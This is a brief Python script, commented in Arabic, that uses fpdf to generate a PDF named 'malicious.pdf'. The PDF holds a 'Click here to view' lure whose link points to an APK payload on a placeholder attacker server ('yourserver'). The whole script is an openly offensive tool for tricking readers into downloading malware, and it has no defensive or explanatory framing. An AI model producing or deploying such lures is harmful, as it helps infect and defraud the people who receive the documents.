from fpdf import FPDF

# إعداد ملف PDF
pdf = FPDF()
pdf.add_page()

# كتابة محتوى للـ PDF
pdf.set_font("Arial", size=12)
pdf.cell(200, 10, txt="Open the link to view the content", ln=True, align="C")

# رابط يشير إلى البايلود
pdf.set_text_color(0, 0, 255)
pdf.set_font("Arial", 'U', size=12)
pdf.cell(200, 10, txt="Click here to view", ln=True, link="http://yourserver/payload.apk")

# حفظ الملف
pdf.output("malicious.pdf")
